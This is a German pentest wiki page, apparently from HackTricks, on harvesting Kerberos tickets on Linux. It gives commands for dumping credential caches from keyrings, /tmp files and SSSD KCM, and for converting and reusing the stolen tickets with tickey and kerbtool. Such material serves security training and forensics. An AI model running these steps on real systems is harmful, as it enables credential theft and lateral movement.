# Sammeln von Tickets unter Linux

{{#include ../../banners/hacktricks-training.md}}

### Speicherung von Anmeldeinformationen in Linux

Linux-Systeme speichern Anmeldeinformationen in drei Cache-Typen, nämlich **Files** (im Verzeichnis `/tmp`), **Kernel Keyrings** (ein spezieller Bereich im Linux-Kernel) und **Process Memory** (für die Nutzung durch einzelne Prozesse). Die Variable **default_ccache_name** in `/etc/krb5.conf` zeigt den verwendeten Speichertyp an und ist standardmäßig `FILE:/tmp/krb5cc_%{uid}`, falls nicht angegeben.

MIT/Heimdal unterstützen außerdem zusätzliche Backends, nach denen du während der post-exploitation suchen solltest:

- `DIR:/run/user/%{uid}/krb5cc` für verzeichnisbasierte Multi-Ticket-Caches (systemd-logind-Standard auf modernen Distros).
- `KEYRING:persistent:%{uid}` oder `KEYRING:session` um ccaches im Kernel-Keyring zu speichern (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, etc.).
- `KCM:%{uid}` wenn SSSD’s Kerberos Cache Manager daemon (kcm) die Ticket-Speicherung vorgelagert.
- `MEMORY:unique_id` für prozesslokale Caches, die von Bibliotheken erstellt werden (`gssproxy`, `sshd`, etc.).

Wann immer du eine Shell erhältst, dumpe `KRB5CCNAME` aus `/proc/<pid>/environ` von interessanten Daemons (z. B. Apache, sshd, gssproxy), um zu wissen, welches Cache-Backend verwendet wird, bevor du Dateien kopierst.

### Auflisten aktiver Caches

Liste die Caches vor der Extraktion auf, um keine hochwertigen Tickets zu übersehen:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
Die Kombination aus `klist`, `keyctl` und der Inspektion von `/proc` zeigt schnell, ob Anmeldeinformationen in Dateien, keyrings oder KCM liegen, sodass du die passende Dumping-Technik wählen kannst.

### Anmeldeinformationen extrahieren

Das Paper von 2017, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), beschreibt Methoden zum Extrahieren von Anmeldeinformationen aus keyrings und Prozessen und betont den Keyring-Mechanismus des Linux-Kernels zur Verwaltung und Speicherung von Schlüsseln.

#### Übersicht zur Keyring-Extraktion

Der **keyctl system call**, eingeführt in Kernel-Version 2.6.10, ermöglicht es Userland-Anwendungen, mit kernel keyrings zu interagieren. In keyrings gespeicherte Anmeldeinformationen werden als Komponenten (default principal und credentials) gespeichert und unterscheiden sich von file ccaches, die zusätzlich einen Header enthalten. Das **hercules.sh script** aus dem Paper demonstriert, wie man diese Komponenten extrahiert und zu einer nutzbaren file ccache rekonstruiert, um Anmeldeinformationen zu stehlen. Denk daran, dass in Keyrings abgelegte ccaches unter `KEYRING:persistent:%{uid}` (permanent über Logins hinweg), `KEYRING:session` (bei Logout gelöscht) oder sogar `KEY_SPEC_THREAD_KEYRING` für Dienste liegen können, die Helper-Threads spawnen — also immer alle Keyring-Typen für die kompromittierte UID aufzählen.

#### Manueller KEYRING-Workflow

Du kannst Tickets manuell auslesen, ohne Hilfsskripte, sobald `default_ccache_name` auf `KEYRING:` gesetzt ist:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
Wenn mehrere principals gespeichert sind, wiederhole den `keyctl pipe`-Schritt für jede Seriennummer und konvertiere die extrahierte ccache anschließend mit Tools wie `kerbtool` (siehe unten) oder `ticketConverter.py` in ein Windows-kompatibles `.kirbi`/`.ccache`, bevor du sie auf anderen Maschinen abspielst.

#### File/DIR Cache Theft — schnelle Erfolge

Wenn Anmeldeinformationen als `FILE:`- oder `DIR:`-Caches gespeichert sind, reichen einfache Dateioperationen in der Regel aus:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Directory-Caches enthalten eine Datei pro Service-Ticket. Komprimiere und exfiltriere das gesamte Verzeichnis, um TGT + TGS-Paare intakt zu halten. Du kannst deine Tools auch direkt auf das Verzeichnis zeigen: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Dumping KCM-verwalteter Caches

SSSDs Kerberos Cache Manager (kcm) leitet die Speicherung von Anmeldeinformationen über `/var/run/kcm/kcmsock` (oder `/run/.heim_org.h5l.kcm-socket`) und speichert verschlüsselte Blobs in `/var/lib/sss/secrets/` zusammen mit `.secrets.mkey`. Angriffsablauf:

1. Erkenne KCM-Nutzung über `/etc/krb5.conf` (`default_ccache_name = KCM:`) oder die Ausgabe von `klist -l`.
2. Wenn du UID 0 hast oder Teil der `kcm` SELinux-Domain bist, liste Caches über das Management-Tool auf:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Offline-Ansatz: Kopiere `/var/lib/sss/secrets/secrets.ldb` sowie `/var/lib/sss/secrets/.secrets.mkey` und führe dann `SSSDKCMExtractor` (oder ähnliche PoCs) aus, um ccaches zu entschlüsseln und wieder zusammenzusetzen, ohne den Live-Socket zu berühren. Das ist besonders nützlich in der Forensik oder wenn Socket-ACLs dich blockieren, aber Festplattenzugriff möglich ist.

Da der kcm daemon UID-basierte ACLs beachtet, die von SSSD durchgesetzt werden, ist in der Regel eine privilege escalation auf root (oder das Kompromittieren von `sssd_kcm`) erforderlich. Sobald dies erreicht ist, kannst du jedoch in Sekunden das TGT jedes Benutzers auslesen.

### Ticket-Extraktionstools

Die Automatisierung der obigen Schritte reduziert Fehler und liefert plattformübergreifendes Ticket-Material, das du mit Windows-Tools wiederverwenden kannst.

#### Tickey

Aufbauend auf den Prinzipien des **hercules.sh script**, ist das [**tickey**](https://github.com/TarlogicSecurity/tickey) Tool speziell dafür ausgelegt, Tickets aus Keyrings zu extrahieren; ausgeführt via `/tmp/tickey -i`. Es listet Kernel-Keyrings auf, rekonstruiert die serialisierten ccaches und schreibt MIT-kompatible Cache-Dateien, die du sofort an `klist`, `impacket-*` oder `kerberoast`-Tools übergeben kannst.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) ist ein modernes Go-Utility, das nativ unter Linux läuft und Kerberos-Tickets parsen, konvertieren und anfordern kann. Zwei nützliche Anwendungsfälle beim Sammeln von Tickets auf Linux-Rechnern:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
Wenn sowohl tickey als auch kerbtool auf Ihrem implant host vorhanden sind, können Sie nahtlos zwischen Linux, Windows und cross-platform Kerberos attack chains wechseln.

## Quellen

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
